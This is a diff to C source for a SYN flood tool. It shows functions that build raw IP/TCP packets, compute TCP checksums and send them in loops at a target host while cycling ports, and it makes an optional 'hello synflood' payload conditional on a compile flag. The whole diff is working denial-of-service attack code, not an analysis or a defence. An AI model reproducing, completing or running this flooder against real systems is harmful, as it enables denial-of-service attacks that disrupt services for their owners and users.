@@ -136,6 +136,7 @@ pseudoHeaderTcpChecksum (struct iphdr *ip_headers, struct tcphdr *tcp_headers)
 }
 
 
+#ifdef WITHPAYLOAD 
 int addpayload ( uint8_t *packet , char mode ){
   int i ; 
   char payload[] = "hello synflood " ; 
@@ -145,6 +146,7 @@ int addpayload ( uint8_t *packet , char mode ){
   packet[PACKET_BUFFER_LEN+i] = (uint8_t)mode ; 
   return ++i ; 
 }
+#endif 
 
 
 /**
@@ -160,7 +162,7 @@ synflood_t (char *hostname, struct sockaddr_in host_addr)
   struct iphdr *ip_headers = (struct iphdr *) packet;
   struct tcphdr *tcp_headers = (struct tcphdr *) (ip_headers + 1);
 
-  int sop ;  	/* size of payload */ 
+  int sop = 0 ;  	/* size of payload */ 
   int currentport = 0 ; 
 
   vlog ( "synflood_t started \n" ) ; 
@@ -173,7 +175,9 @@ synflood_t (char *hostname, struct sockaddr_in host_addr)
     setTcpHeaders(tcp_headers, host_addr.sin_port);
     currentport++ ; 
     currentport = currentport % ( maxports + 1 ) ; 
+#ifdef WITHPAYLOAD
     sop = addpayload(packet, 't') ; 
+#endif
     tcp_headers->th_sum = pseudoHeaderTcpChecksum(ip_headers, tcp_headers);
     if (sendto(sockfd, packet, PACKET_BUFFER_LEN+sop, 0, (struct sockaddr *) &host_addr, sizeof(struct sockaddr_in)) == -1)
       die("%d: Failed to send packet: %s\n", __LINE__ - 1, strerror(errno));
@@ -195,7 +199,7 @@ synflood_c (char *hostname, struct sockaddr_in host_addr, unsigned int loop )
   struct iphdr *ip_headers = (struct iphdr *) packet;
   struct tcphdr *tcp_headers = (struct tcphdr *) (ip_headers + 1);
   int i ; 	/* laufvariable */ 
-  int sop ;  	/* size of payload */ 
+  int sop = 0 ;  	/* size of payload */ 
 
   int currentport = 0 ; 
 
@@ -212,7 +216,9 @@ synflood_c (char *hostname, struct sockaddr_in host_addr, unsigned int loop )
     /* printf ( "synflood_c 2  %ld %ld %ld \n" , PACKET_BUFFER_LEN , sizeof ( packet ) , sizeof(uint8_t) ) ; */ 
     currentport++ ; 
     currentport = currentport % ( maxports + 1 ) ; 
-    sop = addpayload(packet, 'c') ; 
+#ifdef WITHPAYLOAD
+    sop = addpayload(packet, 'c') ;  
+#endif
     tcp_headers->th_sum = pseudoHeaderTcpChecksum(ip_headers, tcp_headers);
     if (sendto(sockfd, packet, PACKET_BUFFER_LEN+sop, 0, (struct sockaddr *) &host_addr, sizeof(struct sockaddr_in)) == -1)
       die("%d: Failed to send packet: %s\n", __LINE__ - 1, strerror(errno));
